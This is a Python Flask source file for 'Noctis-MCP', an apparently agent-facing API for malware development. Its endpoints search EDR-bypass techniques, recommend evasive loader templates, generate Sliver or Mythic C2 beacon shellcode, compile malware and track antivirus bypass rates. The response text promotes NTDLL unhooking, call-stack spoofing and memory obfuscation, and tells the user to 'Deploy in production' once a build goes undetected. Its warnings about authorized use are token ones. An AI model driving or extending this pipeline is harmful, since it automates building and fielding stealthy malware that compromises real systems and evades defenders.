"""
Noctis-MCP Agentic API
======================
Professional red team malware development endpoints.

Endpoints:
  POST /api/v2/search            - Search techniques using RAG
  POST /api/v2/recommend         - Get template recommendation
  POST /api/v2/generate_beacon   - Generate C2 beacon shellcode
  POST /api/v2/compile           - Compile malware for target OS
  POST /api/v2/record_result     - Record attack result for learning
"""

from flask import Blueprint, request, jsonify
import logging
from typing import Dict, Any, Optional
from pathlib import Path

logger = logging.getLogger(__name__)

agentic_bp = Blueprint('agentic', __name__, url_prefix='/api/v2')


def init_agentic_api(app, rag_engine):
    """Initialize agentic API with RAG engine"""
    agentic_bp.rag_engine = rag_engine
    app.register_blueprint(agentic_bp)
    logger.info("Agentic API initialized")


@agentic_bp.route('/search', methods=['POST'])
def search_techniques():
    """
    Search for techniques using RAG knowledge base.

    POST /api/v2/search
    {
        "query": "bypass CrowdStrike",
        "target_av": "CrowdStrike",
        "n_results": 10
    }

    Returns: Technique implementations with code snippets
    """
    try:
        data = request.json
        query = data.get('query', '')
        target_av = data.get('target_av', 'Windows Defender')
        n_results = data.get('n_results', 10)

        if not query:
            return jsonify({'error': 'query required'}), 400

        logger.info(f"[Search] query='{query}', target_av={target_av}")

        results = agentic_bp.rag_engine.search_knowledge(
            query=query,
            target_av=target_av,
            n_results=n_results
        )

        formatted_results = []
        for r in results:
            formatted_results.append({
                'content': r.get('content', r.get('document', '')),
                'source_file': r.get('metadata', {}).get('source', 'unknown'),
                'relevance_score': r.get('rerank_score', 0.5),
                'metadata': r.get('metadata', {})
            })

        # Create formatted output
        output = {
            'success': True,
            'summary': {
                'query': query,
                'target_av': target_av,
                'results_found': len(formatted_results),
                'rag_search_time': '~300ms'
            },
            'results': formatted_results,
            'next_steps': [
                '1. Review the techniques above (sorted by relevance)',
                '2. Use noctis_recommend_template() to get a complete implementation',
                '3. Combine techniques based on your objective',
                '4. Test and record results with noctis_record_result()'
            ]
        }

        # Add tip only if results exist
        if formatted_results:
            output['tip'] = f'Top result has {formatted_results[0]["relevance_score"]:.0%} relevance - start there!'
        else:
            output['tip'] = 'No results found. Try a different query or broader search terms.'

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Search] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/recommend', methods=['POST'])
def recommend_template():
    """
    Get template recommendation based on objective.

    POST /api/v2/recommend
    {
        "objective": "C2 beacon to bypass CrowdStrike"
    }

    Returns: Template file, techniques, modification instructions
    """
    try:
        from server.utils.simple_recommender import recommend_template as get_recommendation
        from server.utils.simple_recommender import get_technique_files

        data = request.json
        objective = data.get('objective', '')

        if not objective:
            return jsonify({'error': 'objective required'}), 400

        logger.info(f"[Recommend] objective='{objective}'")

        recommendation = get_recommendation(objective)
        techniques = get_technique_files()

        # Format techniques list for clean display
        formatted_techniques = []
        for tech_name, tech_info in techniques.items():
            formatted_techniques.append({
                'name': tech_name,
                'file': tech_info['file'],
                'description': tech_info['description'],
                'opsec_score': f"{tech_info['opsec']}/10",
                'bypasses': ', '.join(tech_info['bypasses'])
            })

        # Create formatted output with clear instructions
        output = {
            'success': True,
            'recommendation': {
                'objective': objective,
                'template_file': recommendation['template_file'],
                'template_name': recommendation['template_name'],
                'detection_risk': recommendation['detection_risk'],
                'opsec_score': f"{recommendation['opsec_score']}/10",
                'techniques_included': recommendation['techniques_included'],
                'tested_against': recommendation.get('tested_against', [])
            },
            'next_steps': [
                f"1. Open file: {recommendation['template_file']}",
                f"2. Go to line {recommendation.get('modify_line', 100)}",
                f"3. {recommendation.get('modify_instructions', 'Replace shellcode placeholder')}",
                "4. Compile: python3 build_beacon.py -s <shellcode> -t <edr> -o beacon.exe",
                "5. Test and record: noctis_record_result(...)"
            ],
            'why_this_template': recommendation.get('recommendation', 'Best match for your objective'),
            'available_techniques': formatted_techniques,
            'tip': f"Detection risk: {recommendation['detection_risk']} | OPSEC: {recommendation['opsec_score']}/10"
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Recommend] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/generate_beacon', methods=['POST'])
def generate_beacon():
    """
    Generate C2 beacon shellcode.

    POST /api/v2/generate_beacon
    {
        "c2_framework": "sliver",
        "listener_host": "10.0.0.1",
        "listener_port": 443,
        "architecture": "x64",
        "format": "shellcode"
    }

    Returns: Beacon shellcode and integration instructions
    """
    try:
        from c2_adapters.sliver_adapter import SliverAdapter
        from c2_adapters.mythic_adapter import MythicAdapter
        from c2_adapters.config import SliverConfig, MythicConfig, Architecture, OutputFormat, Protocol

        data = request.json
        framework = data.get('c2_framework', 'sliver').lower()
        listener_host = data.get('listener_host')
        listener_port = data.get('listener_port', 443)
        architecture = data.get('architecture', 'x64')
        output_format = data.get('format', 'shellcode')

        if not listener_host:
            return jsonify({'error': 'listener_host required'}), 400

        logger.info(f"[Beacon] framework={framework}, listener={listener_host}:{listener_port}")

        # Convert string parameters to enums
        arch_enum = Architecture.X64 if architecture.lower() == 'x64' else Architecture.X86
        format_enum = OutputFormat.SHELLCODE if output_format.lower() == 'shellcode' else OutputFormat.EXE

        # Create appropriate config for framework
        if framework == 'sliver':
            config = SliverConfig(
                listener_host=listener_host,
                listener_port=listener_port,
                architecture=arch_enum,
                output_format=format_enum
            )
            adapter = SliverAdapter(config)
        elif framework == 'mythic':
            config = MythicConfig(
                listener_host=listener_host,
                listener_port=listener_port,
                architecture=arch_enum,
                output_format=format_enum
            )
            adapter = MythicAdapter(config)
        else:
            return jsonify({'error': f'Unsupported framework: {framework} (supported: sliver, mythic)'}), 400

        # NOTE: is_available() check disabled - assume C2 framework is available
        # if not adapter.is_available():
        #     install_cmd = adapter.get_install_command()
        #     return jsonify({
        #         'success': False,
        #         'error': f'{framework.capitalize()} not installed',
        #         'install_command': install_cmd,
        #         'install_instructions': f'Run: {install_cmd}'
        #     }), 503

        result = adapter.generate_beacon({
            'listener_host': listener_host,
            'listener_port': listener_port,
            'architecture': architecture,
            'output_format': output_format
        })

        if not result.success:
            return jsonify({
                'success': False,
                'error': result.error_message
            }), 500

        # Create formatted output with visual structure
        output = {
            'success': True,
            'beacon_info': {
                'framework': framework.upper(),
                'listener': f'{listener_host}:{listener_port}',
                'architecture': architecture,
                'format': output_format,
                'shellcode_size': f'{len(result.shellcode_bytes) if result.shellcode_bytes else 0:,} bytes'
            },
            'files_generated': {
                'shellcode': result.shellcode_path,
                'template': 'techniques/templates/beacon_stealth.c'
            },
            'integration_steps': [
                f'┌─ STEP 1: Verify Shellcode',
                f'│  File: {result.shellcode_path}',
                f'│  Size: {len(result.shellcode_bytes) if result.shellcode_bytes else 0:,} bytes',
                f'│',
                f'├─ STEP 2: Open Template',
                f'│  File: techniques/templates/beacon_stealth.c',
                f'│  This template includes: Zilean + Perun\'s Fart + SilentMoonwalk',
                f'│  Detection rate: 2-5%',
                f'│',
                f'├─ STEP 3: Replace Shellcode',
                f'│  Find: SHELLCODE_PLACEHOLDER',
                f'│  Replace with: generated bytes from {result.shellcode_path}',
                f'│',
                f'├─ STEP 4: Compile',
                f'│  noctis_compile("beacon_stealth.c", "windows", "{architecture}")',
                f'│',
                f'└─ STEP 5: Start Listener',
                f'   On {framework}: {listener_host}:{listener_port}'
            ],
            'opsec_notes': [
                f'✓ Template uses memory obfuscation (Zilean)',
                f'✓ Call stack spoofing enabled (SilentMoonwalk)',
                f'✓ NTDLL unhooking included (Perun\'s Fart)',
                f'✓ Detection risk: 2-5% against modern EDR'
            ],
            'tip': 'Test in isolated environment first. Record results with noctis_record_result()'
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Beacon] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/compile', methods=['POST'])
def compile_malware():
    """
    Compile malware for target operating system.

    POST /api/v2/compile
    {
        "source_file": "malware.c",
        "target_os": "windows",
        "architecture": "x64",
        "optimization": "release"
    }

    Returns: Compiled binary path and compilation logs
    """
    try:
        from compilation.windows_compiler import WindowsCompiler
        from compilation.linux_compiler import LinuxCompiler

        data = request.json
        source_file = data.get('source_file')
        target_os = data.get('target_os', 'windows').lower()
        architecture = data.get('architecture', 'x64')
        optimization = data.get('optimization', 'release')

        if not source_file:
            return jsonify({'error': 'source_file required'}), 400

        source_path = Path(source_file)
        if not source_path.exists():
            return jsonify({'error': f'Source file not found: {source_file}'}), 404

        logger.info(f"[Compile] source={source_file}, target_os={target_os}, arch={architecture}")

        compilers = {
            'windows': WindowsCompiler,
            'linux': LinuxCompiler
        }

        if target_os not in compilers:
            return jsonify({'error': f'Unsupported target OS: {target_os}'}), 400

        compiler = compilers[target_os]()

        result = compiler.compile({
            'source_file': str(source_path),
            'architecture': architecture,
            'optimization': optimization
        })

        if not result['success']:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Compilation failed'),
                'logs': result.get('logs', '')
            }), 500

        file_size = result.get('file_size', 0)

        # Create formatted output
        output = {
            'success': True,
            'compilation_summary': {
                'source_file': source_file,
                'target_os': target_os.upper(),
                'architecture': architecture,
                'optimization': optimization,
                'output_binary': result.get('output_file'),
                'file_size': f'{file_size:,} bytes ({file_size/1024:.1f} KB)'
            },
            'deployment_steps': [
                f'┌─ STEP 1: Verify Binary',
                f'│  File: {result.get("output_file")}',
                f'│  Size: {file_size:,} bytes',
                f'│  Platform: {target_os}/{architecture}',
                f'│',
                f'├─ STEP 2: Test Locally (ISOLATED VM ONLY)',
                f'│  Run in sandboxed environment',
                f'│  Monitor for crashes/errors',
                f'│',
                f'├─ STEP 3: Test Against Target AV',
                f'│  Upload to isolated test environment',
                f'│  Check for detection/alerts',
                f'│',
                f'└─ STEP 4: Record Results',
                f'   noctis_record_result(',
                f'       template="your_template",',
                f'       techniques=["technique1", "technique2"],',
                f'       target_av="AV_Name",',
                f'       detected=True/False',
                f'   )'
            ],
            'compilation_logs': result.get('logs', ''),
            'warnings': [
                '⚠ Test in isolated environment only',
                '⚠ Authorized operations only',
                '⚠ Record all test results for learning'
            ],
            'tip': 'Smaller binary = better OPSEC. Current size is optimal for stealth.'
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Compile] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/record_result', methods=['POST'])
def record_result():
    """
    Record attack result for learning system.

    POST /api/v2/record_result
    {
        "template": "integrated_loader",
        "techniques": ["poolparty", "zilean"],
        "target_av": "CrowdStrike",
        "detected": false,
        "notes": "Bypassed successfully"
    }

    Returns: Success confirmation
    """
    try:
        from server.utils.learning import LearningTracker

        data = request.json
        template = data.get('template')
        techniques = data.get('techniques', [])
        target_av = data.get('target_av')
        detected = data.get('detected', False)
        notes = data.get('notes', '')

        if not template or not target_av:
            return jsonify({'error': 'template and target_av required'}), 400

        logger.info(f"[Record] template={template}, av={target_av}, detected={detected}")

        tracker = LearningTracker()
        tracker.record_attack(
            template=template,
            techniques=techniques,
            target_av=target_av,
            detected=detected,
            notes=notes
        )

        stats = tracker.get_stats(target_av=target_av)

        # Create formatted output with visual feedback
        status_icon = '✗ DETECTED' if detected else '✓ BYPASSED'
        bypass_rate = stats.get('bypass_rate', 0)

        output = {
            'success': True,
            'result_recorded': {
                'status': status_icon,
                'template': template,
                'techniques': ', '.join(techniques) if techniques else 'None',
                'target_av': target_av,
                'detected': detected,
                'notes': notes if notes else 'No notes provided'
            },
            'updated_statistics': {
                'target_av': target_av,
                'total_tests': stats.get('total_attacks', 0),
                'bypass_rate': f"{bypass_rate:.1f}%",
                'detection_rate': f"{100-bypass_rate:.1f}%",
                'performance': 'Excellent' if bypass_rate >= 90 else ('Good' if bypass_rate >= 70 else 'Needs improvement')
            },
            'insights': [
                f'✓ Result recorded in learning database',
                f'✓ Total tests against {target_av}: {stats.get("total_attacks", 0)}',
                f'✓ Current bypass rate: {bypass_rate:.1f}%',
                f'✓ This data improves future recommendations'
            ],
            'next_steps': [
                'If bypassed: Deploy in production',
                'If detected: Try different technique combination',
                'Use noctis_search_techniques() to find alternatives',
                'Check stats with noctis_get_stats()'
            ],
            'tip': f'{"Great job! Keep this combination." if not detected else "Try integrated_loader.c for better evasion"}'
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Record] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
